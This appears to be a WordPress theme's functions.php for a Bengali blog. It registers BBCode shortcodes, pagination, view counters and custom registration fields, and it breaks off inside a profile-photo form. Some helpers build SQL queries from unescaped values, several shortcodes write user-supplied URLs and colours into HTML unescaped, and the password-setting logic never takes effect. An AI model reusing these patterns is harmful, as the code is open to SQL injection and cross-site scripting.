<?php 
/* Homepage redirect */
add_filter('login_headerurl','loginpage_custom_link'); 

add_action('login_form', 'redirect_after_login');
function redirect_after_login() {
global $redirect_to;
if (!isset($_GET['redirect_to'])) {
$redirect_to = get_option('siteurl');
}
}
 
add_action( 'after_setup_theme', 'tie_setupss' );
function tie_setupss() {
    register_nav_menus( array(
	    'footer-left'	=> __( 'Footer Left (M)' ),
		'footer-right'	=> __( 'Footer Right (M)' )
	) );
	
	$pagedash = get_page_by_title( 'Mobile Dashboard' );
	if($pagedash==""){
		$my_post1 = array(
		'post_title'    => 'Mobile Dashboard',
		'page_template'  => 'template-mobile-dashboard.php',
		'post_type'     => 'page',
		'post_status'   => 'publish',
		'post_author'   => 1,
		'post_category' => '',
		'comment_status' => 'closed',
		'ping_status'    => 'closed'
		);
		
		// Insert the post into the database
		$pagedash = wp_insert_post( $my_post1 );
	}
	$permalink1 = get_permalink( $pagedash);	$update_val = array( 'plink_dash' => $permalink1);
	update_option('ln_options1', $update_val);
}

function PostCount($user_id, $status){
	global $wpdb;
	$tableName =  $wpdb->prefix . 'posts';
	$query = "SELECT COUNT(*) FROM $tableName WHERE post_status = '$status' AND post_author = '$user_id' AND post_type='post'";
	$post_count = $wpdb->get_var($query);
	return $post_count;
}

function get_image_id($image_url) {
	global $wpdb;
       	$attachment = $wpdb->get_col($wpdb->prepare("SELECT ID FROM $wpdb->posts WHERE guid='%s';", $image_url )); 
    return $attachment[0]; 
}


function post_exist_check($post_id){
	global $wpdb;
       	$post_id = $wpdb->get_col("SELECT `ID` FROM $wpdb->posts WHERE `ID` = '$post_id' AND `post_type` = 'post' AND `post_status` != 'trash'"); 
    return $post_id[0]; 
}

function remove_unnecessary_slug($str){	
	$str = preg_replace('/[^a-zA-Z0-9]/i',' ', $str);
	$str = trim($str);
	$str = preg_replace('/\s+/', ' ', $str);
	$str = preg_replace('/\s+/', ' ', $str);
	$str = ucfirst(strtolower($str));
	return $str;
}

//start for Image bbcode
function azc_bbcode_pic($atts, $content = null) {
	if (empty($atts)){
		$downloadwe = get_template_directory_uri()."/img/placeholder.png";
		$return = "<img src=".$downloadwe." />";
	}else{
		$attribs = implode('',$atts);
		$images = str_replace("'", ' ', str_replace('"', ' ', substr ( $attribs, 1)));
		if(ctype_xdigit($images)) {
			$images_str = wp_get_attachment_url( $images );
			$images_tit = get_the_title( $images );
		}
		$return = "<img src=".$images_str." alt=".$images_tit." />";
	}
	return $return;
}
add_shortcode( 'img', 'azc_bbcode_pic' );
add_shortcode( 'IMG', 'azc_bbcode_pic' );

function azc_bbcode_urdl($atts, $content = null) {
	if (empty($atts)){
		$return = "<a class='azc_bbc_url' href='$content'>".$content."</a>";
	}else{
		$attribs = implode('',$atts);
		$url = substr ( $attribs, 1);
		$url = str_replace("'", '', str_replace('"', '', $url));
		
		$return = "<a href='$url' class='azc_bbc_url'>".$content."</a>";
	}
	return $return;
}
function get_icon_for_attachment($post_id){
  $base = get_template_directory_uri() . "/images/media/";
  $type = get_post_mime_type($post_id);
  switch ($type) {
    case 'image/jpg':
    case 'image/jpeg':
    case 'image/png':
    case 'image/gif':
        return $base . "interactive.png"; break;
    case 'video/mpeg':
    case 'video/mp4': 
    case 'video/quicktime':
        return $base . "video.png"; break;
	case 'audio/mpeg':
    case 'audio/mp4': 
    case 'audio/quicktime':
        return $base . "audio.png"; break;
    case 'text/csv':
    case 'text/plain': 
    case 'text/xml':
        return $base . "text.png"; break; 
	case 'application/zip':
    case 'application/rar':  
        return $base . "archive.png"; break;
	case 'application/msword': 
        return $base . "document.png"; break;
    default:
        return $base . "default.png";
  }
}

add_filter('wp_mail_from', 'new_mail_from');
add_filter('wp_mail_from_name', 'new_mail_from_name');

function new_mail_from($old) {
return 'support@twicebd.com';
}
function new_mail_from_name($old) {
return 'TwiceBD Support™';
}

function remove_footer_admin () {
	echo 'Fueled by <a href="http://www.wordpress.org" target="_blank">WordPress</a> | Designed by <a href="http://facebook.com/0.baijit.bustami" target="_blank">Shahin</a></p>';
}
add_filter('admin_footer_text', 'remove_footer_admin');

if ( current_user_can('administrator') ){
	add_theme_support( 'post-formats', array(
		'aside', 
	) );
	
	function rename_formats_aside($safe_text){
	if ($safe_text == 'Aside')
		return 'Featured Post';
	return $safe_text;
	}add_filter('esc_html','rename_formats_aside');
}

add_filter( 'wp_nav_menu_items', 'wti_loginout_menu_link', 10, 2 );
function wti_loginout_menu_link( $items, $args ) {
    global $current_user; get_currentuserinfo();
    if ($args->theme_location == 'footer-right') {
      if (is_user_logged_in()) {
    $items .= '
	    	<li><a href="'. wp_logout_url() .'">Log Out ('.$current_user->user_login.')</a></li>';
      } else {
         $items .= '';
      }
   }
   return $items;
}








/*Custom Comment*/
function tie_custom_comments( $comment, $args, $depth ) {
$GLOBALS['comment'] = $comment ; ?>
<li id="comment-<?php comment_ID(); ?>" <?php comment_class('comment_list'); ?>>
<div id="div-comment-<?php comment_ID(); ?>" class="comment-body"><div class="comment-author vcard">  
<?php echo get_avatar( $comment, 32 ); ?>
<?php $user_id = get_comment(get_comment_ID())->user_id; 
     $user_info = get_userdata($user_id );
$user_link = get_author_posts_url($user_id);
$role = implode($user_info->roles);
$display_name = $user_info->display_name; ?>
<cite class="fn"><a href="<?php echo $user_link; ?>" class="url"><?php echo $display_name; ?></a><font color="black">
 (<?php echo $role; ?>)</font></cite></div><div class="comment-meta commentmetadata"><?php echo get_comment_date('M j, Y'); ?> at <?php echo get_comment_time('g:i a'); ?><?php edit_comment_link( __( '(Edit)' ), ' ' ); ?></div>
<?php comment_text(); ?>
<div class="reply"><?php comment_reply_link( array_merge( $args, array( 'depth' => $depth, 'max_depth' => $args['max_depth'] ) ) ); ?>
</div></div></li>
<?php }

// disable auto add class
remove_filter( 'the_content', 'wpautop' );
remove_filter( 'the_excerpt', 'wpautop' );

function azc_bbcodccve_code($atts, $content = null){
	$orig = $content;
	$final = htmlentities($orig);
	return "<textarea rows='4' id='content' readonly='readonly' class='pre_codes' style='width:100%;height: 100px;background:#fff;'>".$final."</textarea>";
}
add_shortcode( 'code', 'azc_bbcodccve_code' );
add_shortcode( 'Code', 'azc_bbcodccve_code' );
add_shortcode( 'CODE', 'azc_bbcodccve_code' );

function azc_bbcode_bold($atts, $content = null) {
	return "<span class='azc_bbc_bold'>".do_shortcode($content)."</span>";
}
add_shortcode( 'b', 'azc_bbcode_bold' );
add_shortcode( 'B', 'azc_bbcode_bold' );

function azc_bbcode_line_break($atts, $content = null) {
	return "<br>".do_shortcode($content)."</>";
}
add_shortcode( 'br', 'azc_bbcode_line_break' );
add_shortcode( 'Br', 'azc_bbcode_line_break' );

function azc_bbcode_left($atts, $content = null) {
	return "<left>".do_shortcode($content)."</left>";
}
add_shortcode( 'left', 'azc_bbcode_left' );
add_shortcode( 'left', 'azc_bbcode_left' );

function azc_bbcode_right($atts, $content = null) {
	return "<right>".do_shortcode($content)."</right>";
}
add_shortcode( 'right', 'azc_bbcode_right' );
add_shortcode( 'Right', 'azc_bbcode_right' );

function azc_bbcode_italic($atts, $content = null) {
	return "<span class='azc_bbc_italic'>".do_shortcode($content)."</span>";
}
add_shortcode( 'i', 'azc_bbcode_italic' );
add_shortcode( 'I', 'azc_bbcode_italic' );

function azc_bbcode_sub($atts, $content = null) {
	return "<sub>".do_shortcode($content)."</sub>";
}
add_shortcode( 'sub', 'azc_bbcode_sub' );
add_shortcode( 'Sub', 'azc_bbcode_sub' );

function azc_bbcode_p($atts, $content = null) {
	return "<p class='custom_para'>".do_shortcode($content)."</p>";
}
add_shortcode( 'p', 'azc_bbcode_p' );
add_shortcode( 'P', 'azc_bbcode_p' );

function excerpt_text ($str, $length) {
    if (strlen($str) > $length) {
        $str = substr($str, 0, $length+1);
        $pos = strrpos($str, ' ');
        $str = substr($str, 0, ($pos > 0)? $pos : $length)."&#x0085;";
    }
    return $str;
}

function author_details($post_ID){
$auth = get_post($post_ID); // gets author from post
$authid = $auth->post_author; // gets author id for the post
return $authid;
}

function the_user_id( $display_name ) {
    global $wpdb;
	if ( ! $user = $wpdb->get_row( $wpdb->prepare(
        "SELECT `ID` FROM $wpdb->users WHERE `display_name` = %s", $display_name
    ) ) )
    return false;
	return $user->ID;
}

function azc_bbcode_h1($atts, $content = null) {
	return "<h1 class='custom_para_h1'>".do_shortcode($content)."</h1>";
}
add_shortcode( 'h1', 'azc_bbcode_h1' );
add_shortcode( 'H1', 'azc_bbcode_h1' );

function azc_bbcode_h2($atts, $content = null) {
	return "<h2 class='custom_para_h2'>".do_shortcode($content)."</h2>";
}
add_shortcode( 'h2', 'azc_bbcode_h2' );
add_shortcode( 'H2', 'azc_bbcode_h2' );

function azc_bbcode_h3($atts, $content = null) {
	return "<h3 class='custom_para_h3'>".do_shortcode($content)."</h3>";
}
add_shortcode( 'h3', 'azc_bbcode_h3' );
add_shortcode( 'H3', 'azc_bbcode_h3' );

function azc_bbcode_h4($atts, $content = null) {
	return "<h4 class='custom_para_h4'>".do_shortcode($content)."</h4>";
}
add_shortcode( 'h4', 'azc_bbcode_h4' );
add_shortcode( 'H4', 'azc_bbcode_h4' );

function azc_bbcode_h5($atts, $content = null) {
	return "<h5 class='custom_para_h5'>".do_shortcode($content)."</h5>";
}
add_shortcode( 'h5', 'azc_bbcode_h5' );
add_shortcode( 'H5', 'azc_bbcode_h5' );

function azc_bbcode_h6($atts, $content = null) {
	return "<h6 class='custom_para_h6'>".do_shortcode($content)."</h6>";
}
add_shortcode( 'h6', 'azc_bbcode_h6' );
add_shortcode( 'H6', 'azc_bbcode_h6' );

function azc_bbcode_underline($atts, $content = null) {
	return "<span class='azc_bbc_underline'>".do_shortcode($content)."</span>";
}
add_shortcode( 'u', 'azc_bbcode_underline' );

add_shortcode( 'U', 'azc_bbcode_underline' );

function azc_bbcode_ol($atts, $content = null) {
	return "<ol class='azc_bbc_ol'>".do_shortcode($content)."</ol>";
}
add_shortcode( 'ol', 'azc_bbcode_ol' );
add_shortcode( 'OL', 'azc_bbcode_ol' );

function azc_bbcode_select($atts, $content = null) {
	return "<select name='Options'>".do_shortcode($content)."</select>";
}
add_shortcode( 'select', 'azc_bbcode_select' );
add_shortcode( 'Select', 'azc_bbcode_select' );

function azc_bbcode_option($atts, $content = null) {
	return "<option value=''>".do_shortcode($content)."</option  >";
}
add_shortcode( 'option', 'azc_bbcode_option' );
add_shortcode( 'option', 'azc_bbcode_option' );

function azc_bbcode_ul($atts, $content = null) {
	return "<ul class='azc_bbc_ul'>".do_shortcode($content)."</ul>";
}
add_shortcode( 'ul', 'azc_bbcode_ul' );
add_shortcode( 'UL', 'azc_bbcode_ul' );

function azc_bbcode_li($atts, $content = null) {
	return "<li class='azc_bbc_li'>".do_shortcode($content)."</li>";
}
add_shortcode( 'li', 'azc_bbcode_li' );
add_shortcode( 'LI', 'azc_bbcode_li' );

function azc_bbcode_table($atts, $content = null) {
	return "<table class='azc_bbc_table'>".do_shortcode($content)."</table>";
}
add_shortcode( 'table', 'azc_bbcode_table' );
add_shortcode( 'TABLE', 'azc_bbcode_table' );

function azc_bbcode_tr($atts, $content = null) {
	return "<tr class='azc_bbc_tr'>".do_shortcode($content)."</tr>";
}
add_shortcode( 'tr', 'azc_bbcode_tr' );
add_shortcode( 'TR', 'azc_bbcode_tr' );

function azc_bbcode_th($atts, $content = null) {
	return "<th class='azc_bbc_th'>".do_shortcode($content)."</th>";
}
add_shortcode( 'th', 'azc_bbcode_th' );
add_shortcode( 'TH', 'azc_bbcode_th' );

function azc_bbcode_td($atts, $content = null) {
	return "<td class='azc_bbc_td'>".do_shortcode($content)."</td>";
}
add_shortcode( 'td', 'azc_bbcode_td' );
add_shortcode( 'TD', 'azc_bbcode_td' );

function azc_bbcode_strike($atts, $content = null) {
	return "<span class='azc_bbc_strike'>".do_shortcode($content)."</span>";
}
add_shortcode( 'strike', 'azc_bbcode_strike' );
add_shortcode( 'STRIKE', 'azc_bbcode_strike' );
add_shortcode( 's', 'azc_bbcode_strike' );
add_shortcode( 'S', 'azc_bbcode_strike' );

function azc_bbcode_start($atts, $content = null) {
	global $current_user; 
	get_currentuserinfo();
	$url = home_url();
	if( $content ){
		$texts = $content;
	}else{
		$texts = 'প্রিয় ' . $current_user->display_name.'  ভাই প্রথমে আমার সালাম নেবেন । আশা করি ভালো আছেন । কারণ <a href="twicebd.com'.$url .'>'.get_bloginfo('name').'</a> এর সাথে থাকলে সবাই ভালো থাকে । আর আপনাদের দোয়ায় আমি ও ভালো আছি । তাই আজ নিয়ে এলাম আপনাদের জন্য একদম নতুন একটা  টপিক। আর কথা বাড়াবো না কাজের কথায় আসি ।';
	}
	return "<p>".do_shortcode($texts)."</p>";
}
add_shortcode( 'start', 'azc_bbcode_start' );
add_shortcode( 'Start', 'azc_bbcode_start' );
add_shortcode( 'START', 'azc_bbcode_start' );

function azc_bbcode_end($atts, $content = null) {
	global $current_user; 
	get_currentuserinfo();
	$url = home_url();
	if( $content ){
		$texts = $content;
	}else{
		$texts = 'তাহলে  ' . $current_user->display_name.'  ভাই ভালো থাকুন সুস্থ থাকুন  <a href='.$url .'>'.get_bloginfo('name').'</a> এর সাথে থাকুন।ধন্যবাদ ।';
	}
	return "<p>".do_shortcode($texts)."</p>";
}
add_shortcode( 'end', 'azc_bbcode_end' );
add_shortcode( 'End', 'azc_bbcode_end' );
add_shortcode( 'END', 'azc_bbcode_end' );


function rainbow($text){
    $text = html_entity_decode($text, ENT_QUOTES, 'UTF-8');
    $return = '';

    $colors = new InfiniteIterator(
        new ArrayIterator(
		['5C1FFD', '6619FB', '7113F8', '8709F0', '9106EA', 'A601DD', 'B001D6', 'BA01CD', 'CC04BB', 'D506B2', 'DC0AA8', 'E30F9D', 'EF1A88', 'F4217D', 'F82872', 'FD395D', 'FE4353', 'FE4C49', 'FC6136', 'FA6B2E', 'F77626', 'F2811F', 'E89612', 'E1A10D', 'DAAB09', 'D2B505', 'CABE03', 'C1C801', 'B7D001', 'ADD801', '99E604', '8EEC07', '78F60F', '6EF915', '63FC1B', '59FE22', '45FE32', '3BFD3A', '2AF94D', '23F557', '1CF062', '10E577', '0BDE82', '07D78D', '02C6A2', '01BCAC', '01A9BF', '039EC9', '0594D1', '0889D9', '0D7EE0', '1769ED', '1E5EF2', '2554F6', '2D4AFA', '3541FC', '3E37FE', '482FFE', '5227FE']
        )
    );
    $colors->rewind();

    // Match any codepoint along with any combining marks.
    preg_match_all('/.\pM*+/su', $text, $matches);
    foreach ( $matches[0] as $char){
        if (preg_match('/^\pZ$/u', $char)) {
            // No need to color whitespace or invisible separators.
            $return .= $char;
        }else{
			$return .= "<font color='#".$colors->current()."'>".$char."</font>";
			$colors->next();
        }
    }
    $texts = '<p class="rainbow">'.$return.'</p>';
    return $texts;
}

function azc_bbcode_rainbow($atts, $content = null) {
	$text = rainbow($content);
	return do_shortcode($text);
}
add_shortcode( 'rainbow', 'azc_bbcode_rainbow' );
add_shortcode( 'Rainbow', 'azc_bbcode_rainbow' );
add_shortcode( 'RAINBOW', 'azc_bbcode_rainbow' );

function azc_bbcode_url($atts, $content = null) {
	if (empty($atts)){
		$return = "<a class='azc_bbc_url' href='$content'>".$content."</a>";
	}else{
		$attribs = implode('',$atts);
		$url = substr ( $attribs, 1);
		$url = str_replace("'", '', str_replace('"', '', $url));
		
		$return = "<a href='$url' class='azc_bbc_url'>".$content."</a>";
	}
	return $return;
}
add_shortcode( 'url', 'azc_bbcode_url' );
add_shortcode( 'URL', 'azc_bbcode_url' );
add_shortcode( 'link', 'azc_bbcode_url' );
add_shortcode( 'LINK', 'azc_bbcode_url' );
add_shortcode( 'a', 'azc_bbcode_url' );


function azc_bbcode_video($atts, $content = null) {
	if (empty($atts)){
		$return = "<a class='azc_bbc_url' href='$content'>".$content."</a>";
	}else{
		$attribs = implode('',$atts);
		$url = substr ( $attribs, 1);
		$url = str_replace("'", '', str_replace('"', '', $url));
		preg_match("/^(?:http(?:s)?:\/\/)?(?:www\.)?(?:m\.)?(?:youtu\.be\/|youtube\.com\/(?:(?:watch)?\?(?:.*&)?v(?:i)?=|(?:embed|v|vi|user)\/))([^\?&\"'>]+)/", $url, $matches);
		$id = $matches[1]; 
		
		$return = '<iframe width="100%" height="300px" src="https://www.youtube.com/embed/'.$id.'"></iframe>';
	}
	return $return;
}
add_shortcode( 'youtube', 'azc_bbcode_video' );
add_shortcode( 'Youtube', 'azc_bbcode_video' );
add_shortcode( 'YOUTUBE', 'azc_bbcode_video' );


function azc_bbcode_color($atts, $content = null) {
	if (empty($atts)){
		$color = 'black';
	}else{
		$attribs = implode('',$atts);
		$color = str_replace("'", '', str_replace('"', '', substr ( $attribs, 1)));
		if(ctype_xdigit($color)) {
			$color = '#'.$color;
		}
	}
	return "<span style='color: $color; '>".do_shortcode($content)."</span>";
}
add_shortcode( 'color', 'azc_bbcode_color' );
add_shortcode( 'COLOR', 'azc_bbcode_color' );
add_shortcode( 'colour', 'azc_bbcode_color' );
add_shortcode( 'COLOUR', 'azc_bbcode_color' );

function azc_bbcode_bg_color($atts, $content = null) {
	if (empty($atts)){
		$bg = 'black';
	}else{
		$attribs = implode('',$atts);
		$bg = str_replace("'", '', str_replace('"', '', substr ( $attribs, 1)));
		if(ctype_xdigit($bg)) {
			$bg = '#'.$bg;
		}
	}
	return "<span style='padding:0px 4px;background-color:$bg; '>".do_shortcode($content)."</span>";
}
add_shortcode( 'bg', 'azc_bbcode_bg_color' );
add_shortcode( 'Bg', 'azc_bbcode_bg_color' );
add_shortcode( 'BG', 'azc_bbcode_bg_color' );
add_shortcode( 'bG', 'azc_bbcode_bg_color' );


/* Custom login page logo */
function custom_login_logo() {
	echo '<style type="text/css">h1 a { background-image: url('.get_bloginfo('template_directory').'/images/login-logo.png) !important; background-size: 80% auto !important;
width: 90% !important; height: 80px !important; }</style>'; 
}
add_action('login_head','custom_login_logo');

/* Custom login page url */
function loginpage_custom_link() {
	return '/';
}
add_filter('login_headerurl','loginpage_custom_link');

/* Remove category */
if ( current_user_can('administrator')) {
	
}else{
	function category_reomve(){
	echo ('<style>#taxonomy-category li#category-2{display:none;}</style>');
}
add_action( 'admin_enqueue_scripts', 'category_reomve' );
}
require_once ( get_template_directory() . '/info/loader.php'    );
class PostThumbnailExtras {
	public function __construct(){
		$this->load_requires();
	}

	private $requires = array( 'ntc/php/shortcode.php', 'ntc/php/options.php' );

	private function load_requires(){
		$path =  get_template_directory() . '/'; 
		foreach ( $this->requires as $require ){
			require( $path . $require );
		}
	}
}
$ptx = new PostThumbnailExtras();

/* Remove Admin Bar */
add_filter('show_admin_bar', '__return_false');

/* Thumbnail Support */
add_theme_support( 'post-thumbnails', array( 'post' ) ); 
set_post_thumbnail_size( 310, 210, true );
add_image_size( 'featured', 60, 60, true );
add_image_size( 'tie_thumb'		,110,  100, true );
add_image_size( 'figcaption'    ,310,  165, true );

/* Registered Sidebar */
register_sidebar(array(
    'name' => 'Index Sidebar',
	'id' => 'index_sidebar',
	'description' => 'The index widget area',
	'before_widget' => '<div class="block_posts">',
	'after_widget' => '</ul></div>',
	'before_title' => '<h2>',
	'after_title' => '</h2><ul class="rpul">' )); 


/* View Count */
function getPostViews( $postID ){
	$count_key = 'post_views_count' ;
	$count = get_post_meta ( $postID , $count_key , true );
	if ($count ==''){
		delete_post_meta ( $postID , $count_key );
		add_post_meta ($postID , $count_key, '0' );
		return "0 View" ;
	}
	return $count .' Views' ;
}

function setPostViews ( $postID ) {
	$count_key = 'post_views_count' ;
	$count = get_post_meta ( $postID , $count_key , true );
if ($count ==''){
	$count = 0 ;
	delete_post_meta ( $postID , $count_key );
	add_post_meta ($postID , $count_key, '0' );
} else{
	$count ++;
	update_post_meta ($postID , $count_key , $count );
} } 

/* Round */
function round_num($num, $to_nearest) {
   return floor($num/$to_nearest)*$to_nearest;
}

/* Pagination */ 
function pagenavi($before = '', $after = '') {  
    global $wpdb, $wp_query;
    $pagenavi_options = array();
    $pagenavi_options['pages_text'] = ('Page %CURRENT_PAGE% of %TOTAL_PAGES%');
    $pagenavi_options['current_text'] = '%PAGE_NUMBER%';
    $pagenavi_options['page_text'] = '%PAGE_NUMBER%';
    $pagenavi_options['first_text'] = ('First');
    $pagenavi_options['last_text'] = ('Last');
    $pagenavi_options['next_text'] = '&raquo;';
    $pagenavi_options['prev_text'] = '&laquo;';
    $pagenavi_options['dotright_text'] = '...';
    $pagenavi_options['dotleft_text'] = '...';
    $pagenavi_options['num_pages'] = 5; 
    $pagenavi_options['always_show'] = 0;
    $pagenavi_options['num_larger_page_numbers'] = 0;
    $pagenavi_options['larger_page_numbers_multiple'] = 5;    
    
	if (!is_single()) {
        $request = $wp_query->request;
        $posts_per_page = intval(get_query_var('posts_per_page'));
		$paged = intval(get_query_var('paged'));
        $numposts = $wp_query->found_posts;
        $max_page = $wp_query->max_num_pages;
       
	    if(empty($paged) || $paged == 0) {
            $paged = 1;
        }
        $pages_to_show = intval($pagenavi_options['num_pages']);
        $larger_page_to_show = intval($pagenavi_options['num_larger_page_numbers']);
        $larger_page_multiple = intval($pagenavi_options['larger_page_numbers_multiple']);
        $pages_to_show_minus_1 = $pages_to_show - 1;
        $half_page_start = floor($pages_to_show_minus_1/2);
		$half_page_end = ceil($pages_to_show_minus_1/2);
        $start_page = $paged - $half_page_start;
        if($start_page <= 0) {
            $start_page = 1;
        }
        $end_page = $paged + $half_page_end;
        if(($end_page - $start_page) != $pages_to_show_minus_1) {
            $end_page = $start_page + $pages_to_show_minus_1;
        }
        if($end_page > $max_page) {
            $start_page = $max_page - $pages_to_show_minus_1;
            $end_page = $max_page;
        }
        if($start_page <= 0) {
            $start_page = 1;
        }
        $larger_per_page = $larger_page_to_show*$larger_page_multiple;
        $larger_start_page_start = (round_num($start_page, 10) + $larger_page_multiple) - $larger_per_page;
        $larger_start_page_end = round_num($start_page, 10) + $larger_page_multiple;
        $larger_end_page_start = round_num($end_page, 10) + $larger_page_multiple;
        $larger_end_page_end = round_num($end_page, 10) + ($larger_per_page);
        if($larger_start_page_end - $larger_page_multiple == $start_page) {
            $larger_start_page_start = $larger_start_page_start - $larger_page_multiple;
            $larger_start_page_end = $larger_start_page_end - $larger_page_multiple;
        }   
        if($larger_start_page_start <= 0) {
            $larger_start_page_start = $larger_page_multiple;
        }
        if($larger_start_page_end > $max_page) {
            $larger_start_page_end = $max_page;
        }
        if($larger_end_page_end > $max_page) {
            $larger_end_page_end = $max_page;
        }
        if($max_page > 1 || intval($pagenavi_options['always_show']) == 1) {
            $pages_text = str_replace("%CURRENT_PAGE%", number_format_i18n($paged), $pagenavi_options['pages_text']);
            $pages_text = str_replace("%TOTAL_PAGES%", number_format_i18n($max_page), $pages_text);
            echo $before.'<div id="pagination-links">'."\n";
            if(!empty($pages_text)) {
                echo '<span class="pages">'.$pages_text.'</span>';
            }
			previous_posts_link($pagenavi_options['prev_text']);
             
            if ($start_page >= 2 && $pages_to_show < $max_page) {
                $first_page_text = str_replace("%TOTAL_PAGES%", number_format_i18n($max_page), $pagenavi_options['first_text']);
                echo '<a href="'.esc_url(get_pagenum_link()).'" class="first" title="'.$first_page_text.'">1</a>';
                if(!empty($pagenavi_options['dotleft_text'])) {
                    echo '<span class="expand">'.$pagenavi_options['dotleft_text'].'</span>';
                }
            }
            if($larger_page_to_show > 0 && $larger_start_page_start > 0 && $larger_start_page_end <= $max_page) {
                for($i = $larger_start_page_start; $i < $larger_start_page_end; $i+=$larger_page_multiple) {
                    $page_text = str_replace("%PAGE_NUMBER%", number_format_i18n($i), $pagenavi_options['page_text']);
                    echo '<a href="'.esc_url(get_pagenum_link($i)).'" class="single_page" title="'.$page_text.'">'.$page_text.'</a>';
                }
            }
            for($i = $start_page; $i  <= $end_page; $i++) {                      
                if($i == $paged) {
                    $current_page_text = str_replace("%PAGE_NUMBER%", number_format_i18n($i), $pagenavi_options['current_text']);
                    echo '<span class="current">'.$current_page_text.'</span>';
                } else {
                    $page_text = str_replace("%PAGE_NUMBER%", number_format_i18n($i), $pagenavi_options['page_text']);
                    echo '<a href="'.esc_url(get_pagenum_link($i)).'" class="single_page" title="'.$page_text.'">'.$page_text.'</a>';
                }
            }
            if ($end_page < $max_page) {
                if(!empty($pagenavi_options['dotright_text'])) {
                    echo '<span class="expand">'.$pagenavi_options['dotright_text'].'</span>';
                }
                $last_page_text = str_replace("%TOTAL_PAGES%", number_format_i18n($max_page), $pagenavi_options['last_text']);
                echo '<a href="'.esc_url(get_pagenum_link($max_page)).'" class="last" title="'.$last_page_text.'">'.$max_page.'</a>';
            }
            next_posts_link($pagenavi_options['next_text'], $max_page);
            if($larger_page_to_show > 0 && $larger_end_page_start < $max_page) {
                for($i = $larger_end_page_start; $i <= $larger_end_page_end; $i+=$larger_page_multiple) {
                    $page_text = str_replace("%PAGE_NUMBER%", number_format_i18n($i), $pagenavi_options['page_text']);
                    echo '<a href="'.esc_url(get_pagenum_link($i)).'" class="single_page" title="'.$page_text.'">'.$page_text.'</a>';
                }
            }
            echo '</div>'.$after."\n";
        }
    }
}


/* Custom Field */
add_action( 'register_form', 'myplugin_register_form' );
    function myplugin_register_form() {

    $first_name = ( ! empty( $_POST['first_name'] ) ) ? trim( $_POST['first_name'] ) : '';
	$last_name = ( ! empty( $_POST['last_name'] ) ) ? trim( $_POST['last_name'] ) : '';
	$description = ( ! empty( $_POST['description'] ) ) ? trim( $_POST['description'] ) : '';
        
        ?>
        <p>
            <label for="first_name"><?php _e( 'First Name', 'tie' ) ?><br/>
            <input type="text" name="first_name" id="first_name" class="input" value="<?php echo esc_attr( wp_unslash( $first_name ) ); ?>" size="25" /></label>
        </p>
		<p>
            <label for="last_name"><?php _e( 'Last Name', 'tie' ) ?><br/>
            <input type="text" name="last_name" id="last_name" class="input" value="<?php echo esc_attr( wp_unslash( $last_name ) ); ?>" size="25" /></label>
        </p>
		<p>
            <label for="description"><?php _e( 'About Yourself', 'tie' ) ?><br/>
            <textarea name="description" id="description" class="input" rows="2" value="<?php echo esc_attr( wp_unslash( $description ) ); ?>" /></textarea></label>
        </p>
		<p>
		    <label for="password"><?php _e( 'Password', 'tie' ) ?><br/>
			<input id="password" class="input" type="password" tabindex="30" size="25" value="" name="password" /></label>
		</p>
		<p>
	    	<label for="repeat_password"><?php _e( 'Repeat Password', 'tie' ) ?><br/>
	      	<input id="repeat_password" class="input" type="password" tabindex="40" size="25" value="" name="repeat_password" /></label>
		</p>
		 <?php
}
	
add_filter( 'registration_errors', 'myplugin_registration_errors', 10, 3 );
    function myplugin_registration_errors( $errors, $sanitized_user_login, $user_email ) {
        
        if ( empty( $_POST['first_name'] ) || ! empty( $_POST['first_name'] ) && trim( $_POST['first_name'] ) == '' ) {
            $errors->add( 'first_name_error', __( '<strong>ERROR</strong>: You must include a first name.', 'tie' ) );
        }
		if ( empty( $_POST['last_name'] ) || ! empty( $_POST['last_name'] ) && trim( $_POST['last_name'] ) == '' ) {
            $errors->add( 'first_name_error', __( '<strong>ERROR</strong>: You must include a last name.', 'tie' ) );
        }
		if ( $_POST['password'] !== $_POST['repeat_password'] ) {
	    	$errors->add( 'passwords_not_matched', "<strong>ERROR</strong>: Passwords must match" );
		}
		if ( strlen( $_POST['password'] ) < 8 ) {
     		$errors->add( 'password_too_short', "<strong>ERROR</strong>: Passwords must be at least eight characters long" );
		}
    return $errors;
}
	
add_action( 'user_register', 'myplugin_user_register', 100);
    function myplugin_user_register( $user_id ) {
		$userdata = array();
		$userdata['ID'] = $user_id;
		$new_user_id = wp_update_user( $userdata );
	
        if ( ! empty( $_POST['first_name'] ) ) {
            update_user_meta( $user_id, 'first_name', trim( $_POST['first_name'] ) );
        }
		if ( ! empty( $_POST['last_name'] ) ) {
            update_user_meta( $user_id, 'last_name', trim( $_POST['last_name'] ) );
        }
		if ( ! empty( $_POST['description'] ) ) {
            update_user_meta( $user_id, 'description', trim( $_POST['description'] ) );
        }
		if ( $_POST['password'] !== '' ) {
	    	$userdata['user_pass'] = $_POST['password'];
	    }
}
	
add_filter( 'gettext', 'ts_edit_password_email_text' );
function ts_edit_password_email_text ( $text ) {
	if ( $text == 'A password will be e-mailed to you.' ) {
		$text = 'If you leave password fields empty one will be generated for you. Password must be at least eight characters long.';
	}
	return $text;
}


/*-----------------------------------------------------------------------------------*/
# Profile Photo
/*-----------------------------------------------------------------------------------*/
add_action( 'wp_enqueue_scripts', 'cupp_enqueue_scripts_styles' );
add_action( 'admin_enqueue_scripts', 'cupp_enqueue_scripts_styles' );
function cupp_enqueue_scripts_styles() {
    // Register
    wp_register_style( 'cupp_admin_css',		get_template_directory_uri() . '/css/profile.css', false, '1.0.0', 'all');  
    wp_register_script( 'cupp_admin_js',			get_template_directory_uri() . '/js/scripts-profile.js', array('jquery'), '1.0.0', true );
    
    // Enqueue
    wp_enqueue_style( 'cupp_admin_css' );
    wp_enqueue_script( 'cupp_admin_js' );
}

// Show the new image field in the user profile page.
add_action( 'show_user_profile', 'cupp_profile_img_fields' );
add_action( 'edit_user_profile', 'cupp_profile_img_fields' );

function cupp_profile_img_fields( $user ) {
    if(!current_user_can('upload_files'))
        return false;

    // vars
    $cupp_url = get_the_author_meta( 'cupp_meta', $user->ID );
    $cupp_upload_url = get_the_author_meta( 'cupp_upload_meta', $user->ID );
    $cupp_upload_edit_url = get_the_author_meta( 'cupp_upload_edit_meta', $user->ID );

    if(!$cupp_upload_url){
        $btn_text = 'Upload New Image';
    } else {
        $cupp_upload_edit_url = get_home_url().get_the_author_meta( 'cupp_upload_edit_meta', $user->ID );
        $btn_text = 'Upload Image';
    }
    ?>
	  
    <table class="form-table">
        <tr>
            <th><label for="cupp_meta"><?php _e( 'Profile Photo', 'custom-user-profile-photo' ); ?></label></th>
            <td>
